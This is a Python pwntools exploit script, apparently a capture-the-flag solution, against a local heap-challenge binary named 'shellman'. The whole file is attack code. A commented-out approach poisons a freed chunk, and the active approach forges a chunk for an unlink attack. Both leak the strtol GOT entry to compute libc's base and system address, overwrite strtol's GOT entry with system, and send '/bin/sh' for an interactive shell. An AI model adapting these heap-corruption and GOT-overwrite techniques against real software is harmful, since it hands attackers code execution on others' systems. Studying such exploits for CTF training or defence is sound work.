#!/usr/bin/env python
# encoding: utf-8
from pwn import *
context.update(arch='amd64', os='linux', bits=64, log_level='debug')
binary = "./shellman"
io = process(binary)
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
e = ELF(binary)
libc = ELF(LIBC)
e.checksec()

heap_base = 0x6016C0

gdb.attach(io, """
	c
""")

def new(data):
	global io
	io.recvuntil('> ')
	io.sendline('2')
	io.recvuntil('shellcode: ')
	io.sendline(str(len(data)))
	io.recvuntil('): ')
	io.sendline(data)

def list():
	global io
	io.recvuntil('> ')
	io.sendline('1')

def edit(num, data):
	global io
	io.recvuntil('> ')
	io.sendline('3')
	io.recvuntil('number: ')
	io.sendline(num)
	io.recvuntil('shellcode: ')
	io.sendline(str(len(data)))
	io.recvuntil('shellcode: ')
	io.sendline(data)

def rm(num):
	global io
	io.recvuntil('> ')
	io.sendline('4')
	io.recvuntil('number: ')
	io.sendline(num)

strtol_got = e.got['strtol']
LIBC_STRTOL = libc.symbols['strtol']
LIBC_SYSTEM = libc.symbols['system']

'''
#idea 1
new('a'*0x30)
new('b'*0x20)
#edit('1', 'b'*0x20 + pack(0x00)*2 + pack(-1)+pack(-1))
#pause()
rm('1')
pause()
data = 'a'*0x38 + p64(0x31) + p64(0x06016C0)
edit('0', data)
pause()
new('c'*0x20)
data = p64(strtol_got)+p64(0x00)*3
new(data)
pause()
list()
io.recvuntil('SHELLC0DE 0: ')
strtol_addr = unpack(unhex(io.recv(16)))
print 'strtol_addr: ', hex(strtol_addr)
libc_addr = strtol_addr - LIBC_STRTOL
system_addr = libc_addr + LIBC_SYSTEM
print 'libc_addr: ', hex(libc_addr)
print 'system_addr: ', hex(system_addr)
pause()
edit('0', p64(system_addr))
io.recvuntil('> ')
io.sendline('/bin/sh')
io.interactive()
'''


#idea 2
new('1'*0x80)
new('2'*0x80)
p = ''
p += pack(0x0)
p += pack(0x80)
p += pack(0x6016d0 - 0x18)
p += pack(0x6016d0 - 0x10)
p += '1'*(0x80-4*8)
p += pack(0x80)
p += pack(0x90)
p = p.ljust(0x100, '2')
edit('0', p)
rm('1')
pause()
p2 = pack(0x0) + pack(0x1) + pack(0x08) + pack(strtol_got)
edit('0', p2)
list()
io.recvuntil('SHELLC0DE 0: ')
strtol_addr = unpack(unhex(io.recv(16)))
libc_addr = strtol_addr - LIBC_STRTOL
system_addr = libc_addr + LIBC_SYSTEM
edit('0',pack(system_addr))
io.recvuntil('>')
io.sendline('/bin/sh')
io.interactive()

